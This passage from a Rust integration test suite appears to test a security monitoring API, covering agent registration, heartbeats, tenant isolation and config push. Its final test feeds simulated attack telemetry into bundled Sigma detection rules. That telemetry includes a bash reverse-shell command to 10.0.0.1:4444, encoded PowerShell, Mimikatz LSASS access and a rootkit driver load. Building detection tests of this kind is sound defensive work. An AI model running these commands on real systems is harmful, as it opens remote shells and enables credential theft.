        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id":  agent_id,
                "tenant_id": "tenant-a",
                "hostname":  format!("host-{agent_id}"),
                "os":        "linux",
                "version":   "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(resp.into_body(), 4096).await.unwrap();
    serde_json::from_slice(&bytes).unwrap()
}

#[tokio::test]
async fn agent_register_returns_id() {
    let app = test_router();
    let body = register_test_agent(app, "agent-001").await;
    assert_eq!(body["agent_id"].as_str(), Some("agent-001"));
    assert_eq!(body["status"].as_str(), Some("registered"));
}

#[tokio::test]
async fn agent_heartbeat_returns_ok_and_empty_body() {
    let _app = test_router();

    // Register first
    let req = auth_request(Request::builder())
        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id": "hb-agent", "tenant_id": "tenant-a",
                "hostname": "hb-host", "os": "linux", "version": "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    test_router().oneshot(req).await.unwrap();

    // Fresh router shares no state with the one above; re-register on the same instance
    let _app = test_router();
    let reg = auth_request(Request::builder())
        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id": "hb-agent-2", "tenant_id": "tenant-a",
                "hostname": "hb-host-2", "os": "linux", "version": "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    let app = {
        // Use a shared AppState across requests within this test
        let handle = METRICS
            .get_or_init(|| install_metrics_exporter().expect("metrics"))
            .clone();
        let state = AppState::new(handle);
        let app = build_router(state.clone());

        let resp = app.clone().oneshot(reg).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);

        // Heartbeat
        let hb = auth_request(Request::builder())
            .uri("/api/v1/agents/hb-agent-2/heartbeat")
            .method("POST")
            .body(axum::body::Body::empty())
            .unwrap();
        let resp = app.clone().oneshot(hb).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(resp.into_body(), 4096).await.unwrap();
        let body: Value = serde_json::from_slice(&bytes).unwrap();
        // No pending config → body is empty object
        assert!(body.get("pending_config").is_none());
        app
    };
    let _ = app; // silence unused
}

#[tokio::test]
async fn agent_list_and_tenant_isolation() {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics"))
        .clone();
    let state = AppState::new(handle);
    let app = build_router(state.clone());

    // Register agent under tenant-a
    let reg = auth_request(Request::builder())
        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id": "iso-agent", "tenant_id": "tenant-a",
                "hostname": "iso-host", "os": "linux", "version": "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    app.clone().oneshot(reg).await.unwrap();

    // List as tenant-a — should see the agent
    let list_a = auth_request(Request::builder())
        .uri("/api/v1/agents")
        .method("GET")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp = app.clone().oneshot(list_a).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(resp.into_body(), 16384).await.unwrap();
    let agents: Vec<Value> = serde_json::from_slice(&bytes).unwrap();
    assert!(
        agents.iter().any(|a| a["agent_id"] == "iso-agent"),
        "tenant-a should see its own agent"
    );

    // List as tenant-b — should NOT see tenant-a's agent
    let list_b = Request::builder()
        .uri("/api/v1/agents")
        .method("GET")
        .header("content-type", "application/json")
        .header("x-tenant-id", "tenant-b")
        .header("x-user-id", "soc-admin")
        .header("x-roles", "admin")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp = app.clone().oneshot(list_b).await.unwrap();
    let bytes = axum::body::to_bytes(resp.into_body(), 16384).await.unwrap();
    let agents_b: Vec<Value> = serde_json::from_slice(&bytes).unwrap();
    assert!(
        agents_b.iter().all(|a| a["agent_id"] != "iso-agent"),
        "tenant-b should NOT see tenant-a's agent"
    );
}

#[tokio::test]
async fn agent_patch_group_and_tags() {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics"))
        .clone();
    let state = AppState::new(handle);
    let app = build_router(state.clone());

    // Register
    let reg = auth_request(Request::builder())
        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id": "patch-agent", "tenant_id": "tenant-a",
                "hostname": "patch-host", "os": "linux", "version": "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    app.clone().oneshot(reg).await.unwrap();

    // PATCH group + tags
    let patch = auth_request(Request::builder())
        .uri("/api/v1/agents/patch-agent")
        .method("PATCH")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "group": "prod-web",
                "tags":  ["linux", "critical"],
            }))
            .unwrap(),
        ))
        .unwrap();
    let resp = app.clone().oneshot(patch).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(resp.into_body(), 4096).await.unwrap();
    let body: Value = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(body["group"].as_str(), Some("prod-web"));
    assert_eq!(body["tags"], json!(["linux", "critical"]));
}

#[tokio::test]
async fn agent_config_push_delivered_via_heartbeat() {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics"))
        .clone();
    let state = AppState::new(handle);
    let app = build_router(state.clone());

    // Register
    let reg = auth_request(Request::builder())
        .uri("/api/v1/agents/register")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(&json!({
                "agent_id": "cfg-agent", "tenant_id": "tenant-a",
                "hostname": "cfg-host", "os": "linux", "version": "0.2.0",
            }))
            .unwrap(),
        ))
        .unwrap();
    app.clone().oneshot(reg).await.unwrap();

    // Push config
    let push = auth_request(Request::builder())
        .uri("/api/v1/agents/cfg-agent/config")
        .method("POST")
        .body(axum::body::Body::from(
            serde_json::to_string(
                &json!({ "config_toml": "[collector]\nhost = \"new.example.com\"\n" }),
            )
            .unwrap(),
        ))
        .unwrap();
    let resp = app.clone().oneshot(push).await.unwrap();
    assert_eq!(resp.status(), StatusCode::ACCEPTED);

    // Heartbeat — should deliver the pending config
    let hb = auth_request(Request::builder())
        .uri("/api/v1/agents/cfg-agent/heartbeat")
        .method("POST")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp = app.clone().oneshot(hb).await.unwrap();
    let bytes = axum::body::to_bytes(resp.into_body(), 16384).await.unwrap();
    let body: Value = serde_json::from_slice(&bytes).unwrap();
    assert!(
        body["pending_config"].as_str().is_some(),
        "heartbeat should carry the pending config"
    );

    // Second heartbeat — config should be cleared (delivered only once)
    let hb2 = auth_request(Request::builder())
        .uri("/api/v1/agents/cfg-agent/heartbeat")
        .method("POST")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp2 = app.clone().oneshot(hb2).await.unwrap();
    let bytes2 = axum::body::to_bytes(resp2.into_body(), 4096).await.unwrap();
    let body2: Value = serde_json::from_slice(&bytes2).unwrap();
    assert!(
        body2.get("pending_config").is_none() || body2["pending_config"].is_null(),
        "config should be cleared after first delivery"
    );
}

#[tokio::test]
async fn agent_list_filter_by_group() {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics"))
        .clone();
    let state = AppState::new(handle);
    let app = build_router(state.clone());

    // Register two agents in different groups
    for (id, group) in [("grp-agent-1", "prod-web"), ("grp-agent-2", "prod-db")] {
        let reg = auth_request(Request::builder())
            .uri("/api/v1/agents/register")
            .method("POST")
            .body(axum::body::Body::from(
                serde_json::to_string(&json!({
                    "agent_id": id, "tenant_id": "tenant-a",
                    "hostname": id, "os": "linux", "version": "0.2.0",
                }))
                .unwrap(),
            ))
            .unwrap();
        app.clone().oneshot(reg).await.unwrap();

        let patch = auth_request(Request::builder())
            .uri(format!("/api/v1/agents/{id}"))
            .method("PATCH")
            .body(axum::body::Body::from(
                serde_json::to_string(&json!({ "group": group })).unwrap(),
            ))
            .unwrap();
        app.clone().oneshot(patch).await.unwrap();
    }

    // Filter by group=prod-web
    let list = auth_request(Request::builder())
        .uri("/api/v1/agents?group=prod-web")
        .method("GET")
        .body(axum::body::Body::empty())
        .unwrap();
    let resp = app.clone().oneshot(list).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(resp.into_body(), 16384).await.unwrap();
    let agents: Vec<Value> = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(
        agents.len(),
        1,
        "should return exactly one agent in prod-web"
    );
    assert_eq!(agents[0]["agent_id"].as_str(), Some("grp-agent-1"));
    assert_eq!(agents[0]["group"].as_str(), Some("prod-web"));
}

// ── Bundled Rules End-to-End ─────────────────────────────────────────────────

/// End-to-end test for bundled Sigma rule pack:
///
/// 1. Import all 20 bundled rules from `rules/bundled/` via `rules_pack::import_rules_from_dir`.
/// 2. Ingest events matching 6 different rule categories (Sysmon LSASS, PowerShell,
///    Linux reverse shell, Docker container start, FIM, unsigned driver load).
/// 3. Assert that each matching event generates an alert.
/// 4. Ingest a benign event and assert it does NOT generate an alert.
#[tokio::test]
async fn bundled_rules_e2e_import_ingest_alert() {
    let handle = METRICS
        .get_or_init(|| install_metrics_exporter().expect("metrics"))
        .clone();
    let state = AppState::new(handle);
    let app = build_router(state.clone());

    // ── 1. Import bundled rules ──────────────────────────────────────────────
    let auth = cyberbox_auth::AuthContext {
        tenant_id: "tenant-a".to_string(),
        user_id: "soc-admin".to_string(),
        roles: vec![cyberbox_auth::Role::Admin],
    };

    // Resolve rules/bundled relative to the workspace root (cargo test CWD).
    let rules_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent() // apps/
        .unwrap()
        .parent() // workspace root
        .unwrap()
        .join("rules")
        .join("bundled");
    assert!(
        rules_dir.is_dir(),
        "bundled rules dir must exist: {}",
        rules_dir.display()
    );

    let import_result = cyberbox_api::rules_pack::import_rules_from_dir(
        &auth,
        &state,
        rules_dir.to_str().unwrap(),
        false,
    )
    .await
    .expect("import should succeed");

    assert_eq!(
        import_result.errors.len(),
        0,
        "all bundled rules must compile without errors: {:?}",
        import_result.errors
    );
    assert!(
        import_result.imported >= 19,
        "expected at least 19 imported rules (one is aggregation), got {}",
        import_result.imported
    );

    // Verify rules are in the stream rule cache.
    let cached_rules = state.stream_rule_cache.load("tenant-a");
    assert!(
        cached_rules.len() >= 19,
        "expected at least 19 cached stream rules, got {}",
        cached_rules.len()
    );

    // ── 2. Ingest matching events for 6 different rule categories ────────────
    let now = chrono::Utc::now().to_rfc3339();
    let matching_events = json!({
        "events": [
            // (a) Sysmon: Mimikatz LSASS Access (critical)
            //     rule: event_type=ProcessAccess, TargetImage ends with \lsass.exe,
            //     GrantedAccess contains 0x1010, Image NOT a legitimate process
            {
                "tenant_id": "tenant-a",
                "source": "windows_sysmon",
                "event_time": &now,
                "raw_payload": {
                    "event_type": "ProcessAccess",
                    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                    "GrantedAccess": "0x1010",
                    "Image": "C:\\Users\\attacker\\mimikatz.exe"
                }
            },
            // (b) Sysmon: Suspicious PowerShell (high)
            //     rule: event_type=ProcessCreate, Image ends with \powershell.exe,
            //     CommandLine contains -enc
            {
                "tenant_id": "tenant-a",
                "source": "windows_sysmon",
                "event_time": &now,
                "raw_payload": {
                    "event_type": "ProcessCreate",
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -enc JABjAGwAaQBlAG4AdAA="
                }
            },
            // (c) Linux: Reverse Shell (critical)
            //     rule: CommandLine contains "bash -i >& /dev/tcp/"
            {
                "tenant_id": "tenant-a",
                "source": "agent_forwarded",
                "event_time": &now,
                "raw_payload": {
                    "CommandLine": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                    "Image": "/bin/bash"
                }
            },
            // (d) Docker: Container Start (medium)
            //     rule: docker_action=start
            {
                "tenant_id": "tenant-a",
                "source": "agent_forwarded",
                "event_time": &now,
                "raw_payload": {
                    "docker_action": "start",
                    "container_name": "evil-miner",
                    "image": "alpine:latest"
                }
            },
            // (e) FIM: Sensitive File Modified (high)
            //     rule: fim_event in [modified, created], TargetFilename contains /etc/passwd
            {
                "tenant_id": "tenant-a",
                "source": "agent_forwarded",
                "event_time": &now,
                "raw_payload": {
                    "fim_event": "modified",
                    "TargetFilename": "/etc/passwd"
                }
            },
            // (f) Sysmon: Unsigned Driver Load (critical)
            //     rule: event_type=DriverLoad, Signed=false
            {
                "tenant_id": "tenant-a",
                "source": "windows_sysmon",
                "event_time": &now,
                "raw_payload": {
                    "event_type": "DriverLoad",
                    "Signed": "false",
                    "ImageLoaded": "C:\\Windows\\Temp\\rootkit.sys"
                }
            }
        ]
    });

    let ingest_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/events:ingest")
                .method("POST")
                .body(axum::body::Body::from(matching_events.to_string()))
                .expect("build"),
        )
        .await
        .expect("ingest response");
    assert_eq!(ingest_resp.status(), StatusCode::OK);

    // ── 3. Assert alerts fired ───────────────────────────────────────────────
    let alerts_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/alerts?limit=50")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("alerts response");
    assert_eq!(alerts_resp.status(), StatusCode::OK);

    let body = axum::body::to_bytes(alerts_resp.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let page: Value = serde_json::from_slice(&body).expect("json");
    let alerts = page["alerts"].as_array().expect("alerts array");

    // Collect alert rule_ids for diagnostics.
    let alert_rule_ids: Vec<&str> = alerts
        .iter()
        .filter_map(|a| a["rule_id"].as_str())
        .collect();

    // Each of the 6 matching events should trigger at least one rule.
    // The bundled rule UUIDs that should fire:
    let expected_rule_ids = [
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e01", // Mimikatz LSASS
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e02", // Suspicious PowerShell
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e09", // Linux Reverse Shell
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e14", // Docker Container Start
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e16", // FIM Sensitive File
        "0907f5d6-c2a5-4e3a-bf72-3b3f7a4c5e20", // Unsigned Driver
    ];

    assert!(
        alerts.len() >= 6,
        "expected at least 6 alerts from 6 matching events, got {} alerts with rule_ids: {:?}",
        alerts.len(),
        alert_rule_ids
    );

    for expected_id in &expected_rule_ids {
        assert!(
            alert_rule_ids.iter().any(|id| id == expected_id),
            "expected alert from rule '{}' but not found in: {:?}",
            expected_id,
            alert_rule_ids
        );
    }

    // All alerts should be open
    assert!(
        alerts.iter().all(|a| a["status"].as_str() == Some("open")),
        "all alerts should have status=open"
    );

    // ── 4. Ingest benign event — no new alert ────────────────────────────────
    let alert_count_before = alerts.len();

    let benign = json!({
        "events": [{
            "tenant_id": "tenant-a",
            "source": "windows_sysmon",
            "event_time": &now,
            "raw_payload": {
                "event_type": "ProcessCreate",
                "Image": "C:\\Windows\\System32\\notepad.exe",
                "CommandLine": "notepad.exe readme.txt"
            }
        }]
    });

    let benign_resp = app
        .clone()
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/events:ingest")
                .method("POST")
                .body(axum::body::Body::from(benign.to_string()))
                .expect("build"),
        )
        .await
        .expect("benign ingest");
    assert_eq!(benign_resp.status(), StatusCode::OK);

    let alerts_resp2 = app
        .oneshot(
            auth_request(Request::builder())
                .uri("/api/v1/alerts?limit=50")
                .method("GET")
                .body(axum::body::Body::empty())
                .expect("build"),
        )
        .await
        .expect("alerts response");
    let body = axum::body::to_bytes(alerts_resp2.into_body(), 1024 * 1024)
        .await
        .expect("body");
    let page2: Value = serde_json::from_slice(&body).expect("json");
    let alerts2 = page2["alerts"].as_array().expect("alerts array");

    assert_eq!(
        alerts2.len(),
        alert_count_before,
        "benign event should not generate new alerts"
    );
}
